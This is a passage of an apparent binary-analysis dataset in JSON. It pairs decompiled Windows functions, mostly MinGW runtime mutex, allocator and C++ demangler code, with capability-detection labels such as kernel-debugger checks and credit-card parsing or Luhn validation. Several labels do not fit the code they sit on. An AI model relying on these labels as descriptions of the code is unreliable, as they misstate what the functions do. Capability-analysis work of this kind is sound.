        "decompiled_code": "\nulong fcn.0040b360(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong *puVar5;\n    ulong *puVar6;\n    bool bVar7;\n    int64_t aiStackX8 [4];\n    uint64_t uVar4;\n    \n    uVar4 = 0x30;\n    iVar2 = 0x30;\n    puVar5 = arg1 + 0x10;\n    bVar7 = (puVar5 & 1) != 0;\n    if (bVar7) {\n        puVar5 = arg1 + 0x11;\n        *(arg1 + 0x10) = 0;\n        uVar4 = 0x2f;\n        iVar2 = 0x2f;\n    }\n    if ((puVar5 & 2) == 0) {\n        uVar3 = uVar4;\n    }\n    else {\n        uVar3 = iVar2 - 2;\n        uVar4 = uVar3;\n        *puVar5 = 0;\n        puVar5 = puVar5 + 2;\n    }\n    if ((puVar5 & 4) != 0) {\n        *puVar5 = 0;\n        uVar4 = uVar3 - 4;\n        puVar5 = puVar5 + 4;\n    }\n    for (uVar1 = uVar4 >> 3; uVar1 != 0; uVar1 = uVar1 - 1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    if ((uVar4 & 4) != 0) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 4;\n    }\n    puVar6 = puVar5;\n    if ((uVar4 & 2) != 0) {\n        puVar6 = puVar5 + 2;\n        *puVar5 = 0;\n    }\n    if (bVar7) {\n        *puVar6 = 0;\n    }\n    aiStackX8[0] = arg1;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0x20474343, 0, 1, aiStackX8);\n    return 5;\n}\n",
        "token_count": 516
    },
    "0040e940": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t fcn.0040e940(void)\n\n{\n    int64_t iVar1;\n    \n    if (*0x434a00 == NULL) {\n        *0x434a00 = fcn.00410a00(\"_pthread_cancelling_shmem\", 4, 0);\n    }\n    if ((**0x434a00 == 0) || (iVar1 = fcn.0040cd40(),  iVar1 == 0)) {\n        return 0;\n    }\n    if (0 < *(iVar1 + 0x20)) {\n        return 0;\n    }\n    if ((*(iVar1 + 0x40) & 3) == 0) {\n        return 0;\n    }\n    return *(iVar1 + 0x44) & 1;\n}\n",
        "token_count": 172
    },
    "0040eac0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t * fcn.0040eac0(void)\n\n{\n    uchar *arg2;\n    ulong *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    int32_t *piVar9;\n    int32_t **arg1;\n    char *arg1_00;\n    uint64_t uVar10;\n    uint32_t uVar11;\n    uint64_t uVar12;\n    uint32_t uVar13;\n    bool bVar14;\n    ulong auStack184 [5];\n    ulong uStack144;\n    ulong uStack136;\n    int32_t *apiStack128 [2];\n    \n    piVar6 = fcn.0040cd40();\n    if ((piVar6 == NULL) || ((*(piVar6 + 0x10) & 0xc) != 0)) {\n        return piVar6;\n    }\n    if (*0x434a00 == NULL) {\n        *0x434a00 = fcn.00410a00(\"_pthread_cancelling_shmem\", 4, 0);\n    }\n    if (**0x434a00 == 0) {\n        return *0x434a00;\n    }\n    arg1 = piVar6 + 0xe;\n    fcn.00410710(arg1);\n    if ((((*(piVar6 + 0x10) & 3) != 0) && ((piVar6[0x11] & 1U) != 0)) && (piVar6[8] < 1)) {\n        piVar6[0x11] = piVar6[0x11] & 0xfffffffe;\n        *(piVar6 + 0x10) = *(piVar6 + 0x10) & 0xf3 | 4;\n        if (*(piVar6 + 0xc) != 0) {\n            (*_sym.imp.KERNEL32.dll_ResetEvent)();\n        }\n        fcn.00410100(arg1);\n        fcn.0040e9e0();\n        if (arg1 == NULL) {\n            apiStack128[1] = 0x40ebf5;\n            fcn.0040cd40();\ncode_r0x0040ebce:\n            apiStack128[1] = 0x40ebd3;\n            fcn.0040eac0();\n            apiStack128[1] = 0x40ebdb;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n            apiStack128[1] = 0x40ebe0;\n            fcn.0040eac0();\n            return NULL;\n        }\n        apiStack128[1] = 0x40eb81;\n        uVar12 = fcn.00412280(arg1);\n        if (uVar12 < 0xffffffff) {\n            apiStack128[1] = 0x40ebc5;\n            iVar7 = fcn.0040cd40();\n            uVar10 = uVar12 & 0xffffffff;\n            if (uVar12 == 0) goto code_r0x0040ebce;\n        }\n        else {\n            apiStack128[1] = 0x40eb93;\n            iVar7 = fcn.0040cd40();\n            uVar10 = 0xffffffff;\n        }\n        apiStack128[1] = 0x40eba0;\n        fcn.0040eac0();\n        if (*(iVar7 + 0x30) == 0) {\n            apiStack128[1] = 0x40ec08;\n            (*_sym.imp.KERNEL32.dll_Sleep)(uVar10);\n        }\n        else {\n            apiStack128[1] = 0x40ebb1;\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(iVar7 + 0x30), uVar10);\n        }\n        apiStack128[1] = 0x40ebb6;\n        fcn.0040eac0();\n        return NULL;\n    }\n    piVar6 = fcn.0040fb90(arg1);\n    if (piVar6 != 0) {\n        return piVar6;\n    }\n    uStack136 = *arg1;\n    if (uStack136[2] == 0) {\n        uVar13 = 1;\n        if (uStack136[5] == 0) goto code_r0x0040fec0;\n        goto code_r0x00410130;\n    }\n    iVar4 = uStack136[5];\n    if (iVar4 != 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar4 == iVar5) {\n            if (uStack136[2] == 2) {\n                LOCK();\n                piVar6 = uStack136 + 3;\n                iVar4 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar4 == 1) goto code_r0x00410130;\ncode_r0x00410152:\n                uVar13 = 0;\n            }\n            else {\ncode_r0x00410130:\n                uStack136[5] = 0;\n                if ((*(uStack136 + 6) == 0) ||\n                   (iVar4 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*(uStack136 + 6), 1, 0),  iVar4 != 0))\n                goto code_r0x00410152;\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n                uVar13 = 1;\n                uStack136[5] = iVar4;\n            }\n            uStack136 = *arg1;\n            goto code_r0x0040fec0;\n        }\n        uStack136 = *arg1;\n    }\n    uVar13 = 1;\ncode_r0x0040fec0:\n    apiStack128[0] = uVar13;\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    iVar7 = *0x434a38;\n    if ((*uStack136 == -0x454e0ff3) && (0 < uStack136[1])) {\n        bVar14 = *0x434a38 == 0;\n        uStack136[1] = uStack136[1] + -1;\n        if (bVar14) {\n            *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n            fcn.00410d10(*0x434a38);\n            return apiStack128[0];\n        }\n        fcn.00410d10(iVar7);\n        return apiStack128[0];\n    }\n    iVar7 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf(iVar7 + 0x60, 0x42f208, \"(m_->valid == LIFE_MUTEX) && (m_->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1_00 = \"mutex_global_shmem\";\n    auStack184[0] = 0x410a26;\n    iVar4 = sub.msvcrt.dll_strlen();\n    auStack184[0] = 0x410a3e;\n    iVar7 = fcn.0040b810(arg1_00);\n    iVar7 = -iVar7;\n    arg2 = &stack0xffffffffffffff70 + iVar7;\n    *(&stack0xffffffffffffff70 + iVar7) = 0x656d68732d636367;\n    *(&stack0xffffffffffffff78 + iVar7) = 0x64742d6d;\n    *(&stack0xffffffffffffff7c + iVar7) = 0x326d;\n    uVar13 = iVar4 + 0x50;\n    (&stack0xffffffffffffff7e)[iVar7] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&stack0xffffffffffffff7f + iVar7, \"mutex_global_shmem\", iVar4);\n    puVar1 = &stack0xffffffffffffff80 + iVar4 + iVar7;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    (&stack0xffffffffffffff70)[uVar13 + iVar7] = 0;\n    (&stack0xffffffffffffff70)[(iVar4 + 0xf) + iVar7] = 0;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410ace;\n    uVar8 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    (&stack0xffffffffffffff70)[(iVar4 + 0xf) + iVar7] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410ae4;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar8, 0xffffffff);\n    if (iVar5 != 0) {\n        pcVar2 = swi(3);\n        piVar6 = (*pcVar2)();\n        return piVar6;\n    }\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410af2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b07;\n        piVar9 = sub.msvcrt.dll_malloc(0x10);\n        uVar12 = 0x40;\n        do {\n            if ((piVar9 >> (uVar12 & 0x3f) & 1) != 0) {\n                arg2[uVar13 - uVar12] = 0x41;\n            }\n            uVar11 = uVar12 - 1;\n            uVar12 = uVar11;\n        } while (uVar11 != 0);\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b33;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            piVar6 = (*pcVar2)();\n            return piVar6;\n        }\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b49;\n        piVar6 = fcn.00410980(uVar3, arg2, uVar13, iVar4 + 0x10);\n        if (piVar6 == piVar9) {\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410ba6;\n            sub.msvcrt.dll_memset(piVar9, 0, 0x10);\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410bb1;\n            (*0x40fb30)(piVar9);\n        }\n        else {\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410b59;\n            sub.msvcrt.dll_free(piVar9);\n        }\n    }\n    else {\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b94;\n        piVar6 = fcn.00410980(uVar3, arg2, uVar13, iVar4 + 0x10);\n    }\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar8);\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar8);\n    return piVar6;\n}\n",
        "token_count": 2763
    },
    "00414ab0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong * fcn.00414ab0(int64_t size)\n\n{\n    int64_t *piVar1;\n    ulong arg2;\n    ulong uVar2;\n    char cVar3;\n    int32_t iVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    int64_t **ppiVar8;\n    ulong arg1;\n    uchar *arg3;\n    uint32_t uVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    ulong *puVar13;\n    uchar auStack224 [16];\n    ulong uStack208;\n    int64_t *piStack176;\n    uint64_t uStack168;\n    \n    uStack168 = size + 0xa0;\n    puVar5 = sub.msvcrt.dll_malloc(uStack168);\n    if (puVar5 != NULL) {\ncode_r0x00414ace:\n        iVar6 = fcn.00414fb0();\n        *(iVar6 + 8) = *(iVar6 + 8) + 1;\n        puVar13 = puVar5;\n        for (iVar6 = 0x14; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar13 = 0;\n            puVar13 = puVar13 + 1;\n        }\n        return puVar5 + 0x14;\n    }\n    piVar10 = 0x42c340;\n    iVar4 = fcn.00410710(0x42c340);\n    if (iVar4 == 0) {\n        uVar12 = *0x419f00;\n        if (uStack168 < 0x401) {\n            uVar11 = 0;\n            uVar7 = *0x419f00;\n            do {\n                if ((uVar7 & 1) == 0) {\n                    puVar5 = uVar11 * 0x400 + 0x419f20;\n                    *0x419f00 = 1 << (uVar11 & 0x3f) | *0x419f00;\n                    iVar4 = fcn.00410100(0x42c340);\n                    if (iVar4 == 0) goto code_r0x00414ace;\n                    fcn.00414400();\n                    break;\n                }\n                uVar9 = uVar11 + 1;\n                uVar11 = uVar9;\n                uVar7 = uVar7 >> 1;\n            } while (uVar9 != 0x40);\n        }\n        piVar10 = fcn.00414970();\n        while (uVar12 = uVar12 + 1,  uVar12 != 0) {\n            piVar10 = fcn.0040b420(piVar10);\n        }\n        fcn.00414c70(piVar10);\n    }\n    fcn.004143d0();\n    ppiVar8 = fcn.00414fb0();\n    piStack176 = *ppiVar8;\n    piVar1 = piVar10 + -10;\n    if (*piVar10 + 0xb8b1aabcbcd4d500U < 2) {\n        iVar4 = *(piVar10 + -5);\n        if (iVar4 < 0) {\n            iVar4 = -iVar4;\n        }\n        *(piVar10 + -5) = iVar4 + 1;\n        *(ppiVar8 + 1) = *(ppiVar8 + 1) + -1;\n        if (piVar1 != piStack176) {\n            piVar10[-6] = piStack176;\n            *ppiVar8 = piVar1;\n        }\n        return piVar10[-1];\n    }\n    if (piStack176 == NULL) {\n        *ppiVar8 = piVar1;\n        return NULL;\n    }\n    fcn.00414970();\n    if (piStack176 != NULL) {\n        fcn.00414ba0(piStack176);\n        if (*piStack176 + 0xb8b1aabcbcd4d500U < 2) goto code_r0x00414c5a;\n    }\n    fcn.00414970();\ncode_r0x00414c5a:\n    iVar6 = piStack176[-7];\n    fcn.00413b40();\n    fcn.00414ba0(iVar6);\n    uStack208 = *(iVar6 + -0x10);\n    arg2 = *(iVar6 + -0x18);\n    iVar4 = *(iVar6 + -0x24);\n    uVar2 = *(iVar6 + -0x38);\n    arg1 = fcn.00413b80(*(iVar6 + -0x40));\n    fcn.00414ba0(arg1);\n    piVar10 = fcn.004150e0();\n    puVar13 = *piVar10;\n    puVar5 = puVar13 + 0x12;\n    if ((*(puVar13 + 10) & 1) != 0) {\n        puVar5 = *puVar13;\n    }\n    arg3 = auStack224;\n    fcn.004137f0(0, arg2, arg3);\n    cVar3 = fcn.004138e0(arg3, puVar5[-0x12], puVar5, iVar4);\n    if (cVar3 != '\\0') {\n        arg3 = fcn.004151d0();\n        fcn.00414dd0();\n        fcn.00414dd0();\n        fcn.0040b420(arg3);\n    }\n    cVar3 = fcn.004138e0(arg3, 0x42f560, 0, iVar4);\n    if (cVar3 != '\\0') {\n        puVar5 = fcn.00414ab0(8);\n        *puVar5 = 0x42f910;\n        fcn.00415220(puVar5, 0x42f560, 0x414830);\n    }\n    fcn.00413b40(uVar2);\n    ppiVar8 = fcn.00414fb0();\n    piVar10 = *ppiVar8;\n    if (piVar10 == NULL) {\n        puVar5 = NULL;\n    }\n    else {\n        if ((*(piVar10 + 10) & 1) != 0) {\n            piVar10 = *piVar10 + -0x90;\n        }\n        puVar5 = *piVar10;\n    }\n    return puVar5;\n}\n",
        "token_count": 1427
    },
    "00414d60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t fcn.00414d60(void)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    ppiVar1 = fcn.00414fb0();\n    piVar2 = *ppiVar1;\n    if (piVar2 == NULL) {\n        iVar3 = 0;\n    }\n    else {\n        if ((*(piVar2 + 10) & 1) != 0) {\n            piVar2 = *piVar2 + -0x90;\n        }\n        iVar3 = *piVar2;\n    }\n    return iVar3;\n}\n",
        "token_count": 140
    },
    "00401a30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401850)\n\nulong fcn.00401a30(int64_t arg1, ulong arg2)\n\n{\n    char *arg2_00;\n    char *pcVar1;\n    ulong uVar2;\n    char cVar3;\n    \n    arg2_00 = *(arg1 + 0x18);\n    cVar3 = *arg2_00;\n    pcVar1 = arg2_00;\n    if ((cVar3 == '.') && ((arg2_00[1] + 0x9fU < 0x1a || (arg2_00[1] == '_')))) {\n        cVar3 = arg2_00[2];\n        pcVar1 = arg2_00 + 2;\n        if (0x19 < cVar3 + 0x9fU) goto code_r0x00401af1;\n        do {\n            do {\n                pcVar1 = pcVar1 + 1;\n                cVar3 = *pcVar1;\n            } while (cVar3 + 0x9fU < 0x1a);\ncode_r0x00401af1:\n        } while (cVar3 == '_');\n    }\n    while (cVar3 == '.') {\n        while( true ) {\n            if (9 < pcVar1[1] - 0x30U) goto code_r0x00401a8d;\n            cVar3 = pcVar1[2];\n            pcVar1 = pcVar1 + 2;\n            if (9 < cVar3 - 0x30U) break;\n            do {\n                pcVar1 = pcVar1 + 1;\n            } while (*pcVar1 - 0x30U < 10);\n            if (*pcVar1 != '.') goto code_r0x00401a8d;\n        }\n    }\ncode_r0x00401a8d:\n    *(arg1 + 0x18) = pcVar1;\n    uVar2 = fcn.00401860(arg1, arg2_00, pcVar1 - arg2_00);\n    // WARNING: Could not recover jumptable at 0x004017f7. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar2 = (*(*0x42d38c + 0x42d260))(arg1, 0x4b, arg2, uVar2);\n    return uVar2;\n}\n",
        "token_count": 536
    },
    "00401d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nint32_t fcn.00401d60(char **arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    bool bVar4;\n    \n    pcVar3 = *arg1;\n    cVar1 = *pcVar3;\n    bVar4 = cVar1 == 'n';\n    if (bVar4) {\n        *arg1 = pcVar3 + 1;\n        cVar1 = pcVar3[1];\n    }\n    if (cVar1 - 0x30U < 10) {\n        pcVar3 = *arg1;\n        iVar2 = 0;\n        do {\n            pcVar3 = pcVar3 + 1;\n            *arg1 = pcVar3;\n            iVar2 = cVar1 + -0x30 + iVar2 * 10;\n            cVar1 = *pcVar3;\n        } while (cVar1 - 0x30U < 10);\n    }\n    else {\n        iVar2 = 0;\n    }\n    if (bVar4) {\n        iVar2 = -iVar2;\n    }\n    return iVar2;\n}\n",
        "token_count": 249
    },
    "00401f20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nulong fcn.00401f20(int64_t arg1)\n\n{\n    char cVar1;\n    int64_t arg2;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    char *pcVar5;\n    \n    uVar2 = fcn.00401d60(arg1 + 0x18);\n    if (0 < uVar2) {\n        arg2 = *(arg1 + 0x18);\n        if (*(arg1 + 8) - arg2 < uVar2) {\n            uVar4 = 0;\n        }\n        else {\n            pcVar5 = uVar2 + arg2;\n            *(arg1 + 0x18) = pcVar5;\n            if (((*(arg1 + 0x10) & 4) != 0) && (*pcVar5 == '$')) {\n                *(arg1 + 0x18) = pcVar5 + 1;\n            }\n            if ((((uVar2 < 10) || (iVar3 = sub.msvcrt.dll_memcmp(arg2, \"_GLOBAL_\"),  iVar3 != 0)) ||\n                ((cVar1 = *(arg2 + 8),  cVar1 != '.' && ((cVar1 != '_' && (cVar1 != '$')))))) || (*(arg2 + 9) != 'N')) {\n                uVar4 = fcn.00401860(arg1, arg2, uVar2);\n            }\n            else {\n                *(arg1 + 0x50) = (*(arg1 + 0x50) + 0x16) - uVar2;\n                uVar4 = fcn.00401860(arg1, \"(anonymous namespace)\", 0x15);\n            }\n        }\n        *(arg1 + 0x48) = uVar4;\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 406
    },
    "00401e20": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nint32_t fcn.00401e20(int64_t arg1)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    \n    pcVar2 = *(arg1 + 0x18);\n    if (*pcVar2 == '_') {\n        iVar1 = 0;\ncode_r0x00401e56:\n        *(arg1 + 0x18) = pcVar2 + 1;\n        return iVar1;\n    }\n    if (*pcVar2 != 'n') {\n        iVar1 = fcn.00401d60(arg1 + 0x18);\n        pcVar2 = *(arg1 + 0x18);\n        if (*pcVar2 == '_') {\n            iVar1 = iVar1 + 1;\n            goto code_r0x00401e56;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 183
    },
    "00402240": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nulong fcn.00402240(int64_t arg1)\n\n{\n    ulong uVar1;\n    int32_t *arg3;\n    ulong arg4;\n    char *pcVar2;\n    uint64_t arg3_00;\n    char cVar3;\n    char *pcVar4;\n    \n    pcVar2 = *(arg1 + 0x18);\n    if (*pcVar2 != 'L') {\n        return 0;\n    }\n    pcVar4 = pcVar2 + 1;\n    *(arg1 + 0x18) = pcVar4;\n    cVar3 = pcVar2[1];\n    if (cVar3 == 'Z') {\n        if (cVar3 == '_') goto code_r0x004022a5;\n    }\n    else {\n        if (cVar3 != '_') {\n            arg3 = fcn.00402960(arg1);\n            if (arg3 == NULL) {\n                return 0;\n            }\n            if ((*arg3 == 0x27) && (*(*(arg3 + 2) + 0x1c) != 0)) {\n                *(arg1 + 0x50) = *(arg1 + 0x50) - *(*(arg3 + 2) + 8);\n            }\n            pcVar4 = *(arg1 + 0x18);\n            uVar1 = 0x3b;\n            cVar3 = *pcVar4;\n            pcVar2 = pcVar4;\n            if (cVar3 == 'n') {\n                pcVar2 = pcVar4 + 1;\n                uVar1 = 0x3c;\n                *(arg1 + 0x18) = pcVar2;\n                cVar3 = pcVar4[1];\n            }\n            pcVar4 = pcVar2;\n            if (cVar3 == 'E') {\n                arg3_00 = 0;\n            }\n            else {\n                do {\n                    if (cVar3 == '\\0') {\n                        return 0;\n                    }\n                    pcVar4 = pcVar4 + 1;\n                    *(arg1 + 0x18) = pcVar4;\n                    cVar3 = *pcVar4;\n                } while (cVar3 != 'E');\n                arg3_00 = pcVar4 - pcVar2;\n            }\n            arg4 = fcn.00401860(arg1, pcVar2, arg3_00);\n            uVar1 = fcn.004017e0(arg1, uVar1, arg3, arg4);\n            pcVar4 = *(arg1 + 0x18);\n            cVar3 = *pcVar4;\n            goto code_r0x00402284;\n        }\ncode_r0x004022a5:\n        pcVar4 = pcVar2 + 2;\n        *(arg1 + 0x18) = pcVar4;\n        cVar3 = pcVar2[2];\n        uVar1 = 0;\n        if (cVar3 != 'Z') goto code_r0x00402284;\n    }\n    *(arg1 + 0x18) = pcVar4 + 1;\n    uVar1 = fcn.00403430(arg1, 0);\n    pcVar4 = *(arg1 + 0x18);\n    cVar3 = *pcVar4;\ncode_r0x00402284:\n    if (cVar3 != 'E') {\n        return 0;\n    }\n    *(arg1 + 0x18) = pcVar4 + 1;\n    return uVar1;\n}\n",
        "token_count": 769
    },
    "004024c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.004024c0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong arg3;\n    int64_t arg4;\n    int32_t *piVar7;\n    int32_t *arg4_00;\n    char *pcVar8;\n    char cVar9;\n    int64_t iStack48;\n    \n    pcVar8 = *(arg1 + 0x18);\n    if (*pcVar8 + 0xb4U < 0xf) {\n    // switch table (15 cases) at 0x42d4f0\n        switch(*((*pcVar8 + 0xb4U) * 4 + 0x42d4f0) + 0x42d4f0) {\n        case 0x4024f2:\n            *(arg1 + 0x18) = pcVar8 + 1;\n            uVar6 = fcn.00403430(arg1, 0);\n            pcVar8 = *(arg1 + 0x18);\n            if (*pcVar8 == 'E') {\n                *(arg1 + 0x18) = pcVar8 + 1;\n                if (pcVar8[1] == 's') {\n                    *(arg1 + 0x18) = pcVar8 + 2;\n                    iVar1 = fcn.00401ee0(arg1);\n                    if (iVar1 != 0) {\n                        arg4_00 = fcn.00401860(arg1, \"string literal\", 0xe);\ncode_r0x00402889:\n                        iVar5 = fcn.004017e0(arg1, 2, uVar6, arg4_00);\n                        return iVar5;\n                    }\n                }\n                else {\n                    iVar1 = -1;\n                    if (pcVar8[1] == 'd') {\n                        *(arg1 + 0x18) = pcVar8 + 2;\n                        iVar1 = fcn.00401e20(arg1);\n                        if (iVar1 < 0) {\n                            return 0;\n                        }\n                    }\n                    piVar7 = fcn.004024c0(arg1);\n                    if ((((piVar7 == NULL) || (*piVar7 == 0x44)) || (*piVar7 == 0x46)) ||\n                       (iVar2 = fcn.00401ee0(arg1),  iVar2 != 0)) {\n                        arg4_00 = piVar7;\n                        if (iVar1 != -1) {\n                            iVar2 = *(arg1 + 0x28);\n                            arg4_00 = NULL;\n                            if (iVar2 < *(arg1 + 0x2c)) {\n                                *(arg1 + 0x28) = iVar2 + 1;\n                                arg4_00 = *(arg1 + 0x20) + iVar2 * 0x18;\n                                if (arg4_00 != NULL) {\n                                    *arg4_00 = 0x45;\n                                    arg4_00[4] = iVar1;\n                                    *(arg4_00 + 2) = piVar7;\n                                }\n                            }\n                        }\n                        goto code_r0x00402889;\n                    }\n                }\n            }\n            return 0;\n        case 0x402524:\n            if (pcVar8[1] == 't') {\n                *(arg1 + 0x18) = pcVar8 + 2;\n                uVar6 = fcn.00403be0(arg1);\n                arg3 = fcn.00401860(arg1, 0x42d4eb, 3);\n                iVar5 = fcn.004017e0(arg1, 1, arg3, uVar6);\n                *(arg1 + 0x50) = *(arg1 + 0x50) + 3;\n                if (**(arg1 + 0x18) != 'I') {\n                    return iVar5;\n                }\n                if (iVar5 == 0) {\n                    return 0;\n                }\n                iVar1 = *(arg1 + 0x38);\n                if (*(arg1 + 0x3c) <= iVar1) {\n                    return 0;\n                }\n                *(*(arg1 + 0x30) + iVar1 * 8) = iVar5;\n                *(arg1 + 0x38) = iVar1 + 1;\n            }\n            else {\n                iVar5 = fcn.00401b00(arg1, 0);\n                if (**(arg1 + 0x18) != 'I') {\n                    return iVar5;\n                }\n            }\n            uVar6 = fcn.004023a0(arg1);\n            iVar5 = fcn.004017e0(arg1, 4, iVar5, uVar6);\n            break;\n        case 0x402570:\n            iVar5 = fcn.00403be0(arg1);\n            break;\n        case 0x402590:\n            *(arg1 + 0x18) = pcVar8 + 1;\n            piVar3 = fcn.004018b0(arg1, &iStack48, 1);\n            if (piVar3 == NULL) {\n                return 0;\n            }\n            iVar4 = fcn.004019d0(arg1, 0);\n            pcVar8 = *(arg1 + 0x18);\n            cVar9 = *pcVar8;\n            iVar5 = 0;\njoined_r0x004025d2:\n            if (cVar9 != '\\0') {\n                if (cVar9 == 'D') {\n                    if ((pcVar8[1] & 0xdfU) != 0x54) goto code_r0x00402740;\n                    arg4 = fcn.00402960(arg1);\n                    goto joined_r0x004027b9;\n                }\n                do {\n                    if (((cVar9 - 0x30U < 10) || (cVar9 + 0x9fU < 0x1a)) ||\n                       ((cVar9 == 'C' || ((cVar9 == 'U' || (cVar9 == 'L')))))) {\ncode_r0x00402740:\n                        arg4 = fcn.00403be0(arg1);\njoined_r0x004027b9:\n                        if (iVar5 != 0) {\n                            uVar6 = 1;\n                            goto code_r0x00402752;\n                        }\n                    }\n                    else {\n                        if (cVar9 == 'S') {\n                            arg4 = fcn.00401b00(arg1, 1);\n                            goto joined_r0x004027b9;\n                        }\n                        if (cVar9 != 'I') {\n                            if (cVar9 == 'T') {\n                                arg4 = fcn.00401e70(arg1);\n                                goto joined_r0x004027b9;\n                            }\n                            if (cVar9 == 'E') {\n                                *piVar3 = iVar5;\n                                if (iVar5 == 0) {\n                                    return 0;\n                                }\n                                if (iVar4 != 0) {\n                                    *(iVar4 + 8) = iStack48;\n                                    iStack48 = iVar4;\n                                }\n                                if (**(arg1 + 0x18) == 'E') {\n                                    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                                    return iStack48;\n                                }\n                                return 0;\n                            }\n                            if ((cVar9 != 'M') || (iVar5 == 0)) break;\n                            *(arg1 + 0x18) = pcVar8 + 1;\n                            cVar9 = pcVar8[1];\n                            pcVar8 = pcVar8 + 1;\n                            goto joined_r0x004025d2;\n                        }\n                        if (iVar5 == 0) break;\n                        arg4 = fcn.004023a0(arg1);\n                        uVar6 = 4;\ncode_r0x00402752:\n                        arg4 = fcn.004017e0(arg1, uVar6, iVar5, arg4);\n                    }\n                    iVar5 = arg4;\n                    if (cVar9 == 'S') goto code_r0x00402797;\n                    pcVar8 = *(arg1 + 0x18);\n                    if (*pcVar8 != 'E') goto code_r0x00402771;\n                    cVar9 = 'E';\n                } while( true );\n            }\n            goto 